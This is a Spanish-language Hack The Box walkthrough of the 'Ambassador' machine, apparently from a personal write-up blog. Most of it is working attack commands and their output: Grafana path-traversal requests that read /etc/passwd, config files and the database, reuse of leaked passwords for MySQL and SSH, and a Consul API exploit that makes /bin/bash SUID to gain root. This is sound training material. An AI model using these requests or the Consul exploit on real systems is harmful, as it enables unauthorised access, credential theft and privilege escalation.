---
layout: post
title: Ambassador
date: 2023-02-02
description:
img:
fig-caption:
tags: [ eWPT, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Ambassador-htb/Ambassador_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* LFI

* Log Poissoning (Fallido)

* Enumeración de archivo SQLite3

* Enumeración Proyecto de Github

* Reutilización de credenciales

* Abuso de API en consul

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -Pn -n -sS -vvv 10.10.11.183 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 09:20 GMT
Initiating SYN Stealth Scan at 09:20
Scanning 10.10.11.183 [65535 ports]
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 80/tcp on 10.10.11.183
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 3000/tcp on 10.10.11.183
Completed SYN Stealth Scan at 09:20, 12.60s elapsed (65535 total ports)
Nmap scan report for 10.10.11.183
Host is up, received user-set (0.044s latency).
Scanned at 2023-02-02 09:20:19 GMT for 12s
Not shown: 65448 closed tcp ports (reset), 83 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
           Raw packets sent: 68189 (3.000MB) | Rcvd: 65453 (2.618MB)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,3000,3306 10.10.11.183 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 09:20 GMT
Nmap scan report for 10.10.11.183
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 02 Feb 2023 09:21:33 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 02 Feb 2023 09:21:00 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 02 Feb 2023 09:21:06 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, ConnectWithDatabase, IgnoreSigpipes, SupportsCompression, LongColumnFlag, FoundRows, LongPassword, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: J`\x19%bVA{\x0B\x19\x02Aa,QG4d _
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=2/2%Time=63DB807B%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Thu,\x2002\x20Feb\x202023\x2009:21:
SF:00\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Thu
SF:,\x2002\x20Feb\x202023\x2009:21:06\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Thu,\x2002\x20Feb\x202023\x2009:21:33\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.73 seconds
```

## Puerto 80 (HTTP) | Puerto 3000 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
for i in 80 3000; do echo -e "\n[+] Puerto $i"; whatweb http://10.10.11.183:$i; done

[+] Puerto 80
http://10.10.11.183:80 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.183], MetaGenerator[Hugo 0.94.2], Open-Graph-Protocol[website], Title[Ambassador Development Server], X-UA-Compatible[IE=edge]

[+] Puerto 3000
http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

En el navegador se ve de la siguiente forma

<img src="/writeups/assets/img/Ambassador-htb/1.png" alt="">

Se leakea la versión de Grafana

<img src="/writeups/assets/img/Ambassador-htb/2.png" alt="">

Encuentro un exploit que contempla un LFI

```null
searchsploit grafana
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                                                                                                                        | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                                    | multiple/webapps/50581.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Se dirije a un plugin de una lista que tiene definida para hacer un path traversal y cargar el archivo que desea leer

```null
try:
    url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```
Pruebo a tramitar una petición con curl, pero me redirige a /login. Para evitarlo, añado el argumento --path-as-is para que no interprete el traversal y pueda llegar a incluir el archivo

```null
url 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../etc/passwd' --path-as-is
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

En el puerto 80 daban una pista (CTF-like) que diciendo que tengo que ganar acceso por SSH como el usuario developer. Pruebo a traerme su id_rsa, pero no exite.

```null
curl 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../home/developer/.ssh/id_rsa' --path-as-is
{"message":"Could not open plugin file"}
```

Para aquellos que si que existen pero no tengo acceso aparece otro error

```null
curl 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../proc/net/fib_trie' --path-as-is
seeker can't seek
```

En la web de instalación de Grafana, se pueden ver las rutas de los archivos de configuración

<img src="/writeups/assets/img/Ambassador-htb/3.png" alt="">

Hay un archivo de LOGS. Podría tratar de inyectar una sentencia en PHP y ver si me la interpreta, pero no tengo ningún campo que pueda modificar fácilmente como el User-Agent

```null
curl 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../var/log/grafana/grafana.log' --path-as-is
```

Puedo ver el error de falta de acceso a la id_rsa

```null
t=2023-02-02T09:57:57+0000 lvl=eror msg="Could not open plugin file" logger=context userId=0 orgId=0 uname= error="open /home/developer/.ssh/id_rsa: permission denied"
```

Puedo descargarme un archivo de base de datos en SQLite3

```null
curl 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db' --path-as-is
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
curl -s 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../var/lib/grafana/grafana.db' --path-as-is -o grafana.db
```

Y listar las tablas

```null
sqlite3 grafana.db
SQLite version 3.40.0 2022-11-16 12:10:08
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token   
```

La tabla user está estructurada de la siguiente manera:

```null
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);
```

Me quedo con los campos de usuario y contraseña

```null
sqlite> select * from user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-09-14 16:44:19|0
```

Podría intentar de romper el hash para encontrar la contraseña en texto claro, pero como está formado, tiene pinta de que le tengo que pasar salts y otros valores al hashcat y sería dificil de obtener.

En el archivo de configuración de Grafana, hay un token secreto y la contraseña del usuario administrador

```null
curl 'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../etc/grafana/grafana.ini' --path-as-is

...
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

...
```

Me puedo loggear en la web

<img src="/writeups/assets/img/Ambassador-htb/4.png" alt="">

Encuentro una base de datos de MySQL

<img src="/writeups/assets/img/Ambassador-htb/5.png" alt="">

Pero necesito una contraseña para poder entrar

<img src="/writeups/assets/img/Ambassador-htb/6.png" alt="">

Vuelvo a SQLite y busco por la tabla donde está almacenada esa credencial

```null
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-02-02 09:13:33|0|{}|1|uKewFgM4z
```

Como el puerto de MySQL está abierto externamente, pruebo primero a conectarme por consola

```null
mysql -ugrafana -p -h 10.10.11.183
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 17
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Enumero las bases de datos

```null
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.056 sec)
```

Encuentro la contraseña del usuario developer

```null
MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.062 sec)

MySQL [whackywidget]> describe users;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| user  | varchar(255) | YES  |     | NULL    |       |
| pass  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows in set (0.049 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.047 sec)
```

Está en base64. Le hago el proceso inverso

```null
echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d
anEnglishManInNewYork027468
```

Me conecto por SSH a la máquina

```null
ssh developer@10.10.11.183
The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

developer@ambassador:~$ whoami
developer
```

Puedo visualizar la primera flag

```null
developer@ambassador:~$ cat user.txt 
14086e1e4b149dbd626efd08a3d60e34
```

# Escalada

Dentro del directorio actual, hay un archivo de configuración de un proyecto Git

```null
developer@ambassador:~$ ls -la
total 48
drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 .
drwxr-xr-x 3 root      root      4096 Mar 13  2022 ..
lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
drwx------ 3 developer developer 4096 Mar 13  2022 .cache
-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg
drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 3 developer developer 4096 Mar 14  2022 snap
drwx------ 2 developer developer 4096 Mar 13  2022 .ssh
-rw-r----- 1 root      developer   33 Feb  2 09:13 user.txt
developer@ambassador:~$ cat .gitconfig 
[user]
	name = Developer
	email = developer@ambassador.local
[safe]
	directory = /opt/my-app
```

Como se leakea la ruta donde está el repositorio puedo ir a ver su contenido

Tiene varios commits

```null
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
`` 

En el último se borró el token que permite el acceso a MySQL

```null
developer@ambassador:/opt/my-app/env$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

En el comentario hace referencia a una aplicación llamada consul. Me aseguro de que existe

```null
developer@ambassador:/opt/my-app/env$ which consul
/usr/bin/consul
```

Mirando el panel de ayuda, encuentro una forma de ejecutar comandos, pero de momento no puedo ni para mi propio usuario

```null
developer@ambassador:/opt/my-app/env$ consul exec -shell whoami
Error querying Consul agent: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'agent:read' on "ambassador")
```

Exiten varios exploits que contemplan RCE en consul

```null
searchsploit consul
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                                                                                                            | linux/remote/46073.rb
Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                                                                                                     | linux/remote/46074.rb
Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                                                                                                    | cgi/remote/20281.txt
Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                                                                                                            | cgi/remote/21104.pl
PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                                                                                                     | php/webapps/28864.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Para no usar Metasploit, busco una alternativa en Github. Encuentro este [script](https://github.com/owalid/consul-rce) que abusa de la API para ejecutar comandos

Com el servicio de consul lo está ejecutando root, me puedo convertir en este usuario

```null
developer@ambassador:/opt/my-app/env$ ps -faux | grep consul
root        1094  0.3  3.7 794548 75892 ?        Ssl  09:13   0:28 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

Ejecuto el exploit en la máquina víctima y le paso como token el que se borró de MySQL

```null
developer@ambassador:/tmp$ python3 consul_rce.py -th 127.0.0.1 -tp 8500 -c 'chmod u+s /bin/bash' -ct bb03b43b-1d81-d62b-24b5-39540ee469b5
[+] Check vzzjfgldlobkyir created successfully

[+] Check vzzjfgldlobkyir deregistered successfully
```

Ahora la bash es SUID y puedo ejecutar comandos como el propietario que es root

```null
developer@ambassador:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Puedo ver la segunda flag

```null
developer@ambassador:/tmp$ bash -p
bash-5.0# cat /root/root.txt
cc7ce9218ebc3a06e78e5e51fcd5ba82
```